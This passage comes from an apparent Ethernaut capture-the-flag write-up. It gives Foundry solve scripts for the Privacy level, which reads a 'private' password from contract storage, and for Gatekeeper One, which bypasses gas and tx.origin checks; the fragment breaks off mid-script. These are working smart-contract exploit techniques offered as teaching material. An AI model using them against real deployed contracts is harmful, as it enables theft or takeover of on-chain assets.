&lt;&#x2F;span&gt;&lt;span&gt;bytes32[3] private data;    &#x2F;&#x2F; data[0] =&amp;gt; slot 3  &#x2F;&#x2F; data[1] =&amp;gt; slot 4  &#x2F;&#x2F; data[2] =&amp;gt; slot 5
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;Password is the lower 16 bytes of the &lt;code&gt;data[2]&lt;&#x2F;code&gt;, i.e &lt;code&gt;require(_key == bytes16(data[2]));&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Since the &lt;code&gt;data[2]&lt;&#x2F;code&gt; stored at slot 5, we can query it with &lt;code&gt;vm.load&lt;&#x2F;code&gt; cheatcode.&lt;&#x2F;li&gt;
&lt;li&gt;Calling unlock with this password will solve the challenge.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;PrivacySolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Privacy} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Privacy.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract PrivacySolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Privacy public privacy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Privacy&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x97Fd86fBE6F968de018C7C15B9D2f2cb2Caa94b2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 slot5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;load&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(privacy)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;logBytes32&lt;&#x2F;span&gt;&lt;span&gt;(slot5)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Locked : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;privacy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;locked&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        privacy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unlock&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes16&lt;&#x2F;span&gt;&lt;span&gt;(slot5))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Locked : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;privacy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;locked&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;PrivacySolve.s.sol:PrivacySolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;13-gatekeeper-one&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#13-gatekeeper-one&quot; aria-label=&quot;Anchor link for: 13-gatekeeper-one&quot;&gt;13 Gatekeeper One&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;GatekeeperOne.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GatekeeperOne {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  address public entrant&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateOne&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateTwo&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gasleft&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8191 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gateThree&lt;&#x2F;span&gt;&lt;span&gt;(bytes8 _gateKey) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint16&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;GatekeeperOne: invalid gateThree part one&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;GatekeeperOne: invalid gateThree part two&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint32&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint64&lt;&#x2F;span&gt;&lt;span&gt;(_gateKey)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint16&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;uint160&lt;&#x2F;span&gt;&lt;span&gt;(tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;GatekeeperOne: invalid gateThree part three&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes8 _gateKey&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public gateOne gateTwo gateThree&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_gateKey&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    entrant &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;tx&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;origin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Make it past the gatekeeper and register as an entrant to pass this level.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We have to successfully call the &lt;code&gt;enter()&lt;&#x2F;code&gt; function, without being revert by modifier checks.&lt;&#x2F;li&gt;
&lt;li&gt;We need to pass three modifier checks. We can simply pass &lt;code&gt;gateOne()&lt;&#x2F;code&gt; by calling it from another contract.&lt;&#x2F;li&gt;
&lt;li&gt;To bypass &lt;code&gt;gateTwo()&lt;&#x2F;code&gt; we need to send exact &lt;code&gt;gas&lt;&#x2F;code&gt; that should result the modulo 8191 to zero.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;gasLeft()&lt;&#x2F;code&gt; is a method which calculates the remaining gas after executing instructions before it invoked.&lt;&#x2F;li&gt;
&lt;li&gt;We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.&lt;&#x2F;li&gt;
&lt;li&gt;One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.&lt;&#x2F;li&gt;
&lt;li&gt;To pass the &lt;code&gt;gateThree()&lt;&#x2F;code&gt; we need to some calculations. It takes the &lt;code&gt;_gateKey&lt;&#x2F;code&gt; a bytes8 value as argument.&lt;&#x2F;li&gt;
&lt;li&gt;Lets calculate from last check.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;uint16 third = uint16(uint160(tx.origin));
&lt;&#x2F;span&gt;&lt;span&gt;uint32 two = uint32(third);
&lt;&#x2F;span&gt;&lt;span&gt;bytes8 one = bytes8(abi.encodePacked(uint32(0xdeadbeef),two));
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;9&quot;&gt;
&lt;li&gt;The modifiers checks the lower 32 bits of the gatekey after converting to uint64.&lt;&#x2F;li&gt;
&lt;li&gt;So, we can calculate the lower 16 bits of the &lt;code&gt;tx.orgin&lt;&#x2F;code&gt; and pad it with zeros to pass the gatThree and gateOne.&lt;&#x2F;li&gt;
&lt;li&gt;Two pass the gateTwo we can add random bits to the MSB position.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;GatekeeperSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{GatekeeperOne} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;GatekeeperOne.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract GatekeeperOneSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    GatekeeperOne public gateOne &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GatekeeperOne&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4742252E47788a20b2C78a1343DEE68EC8De3804&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Entrant : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(gateOne&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;entrant&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
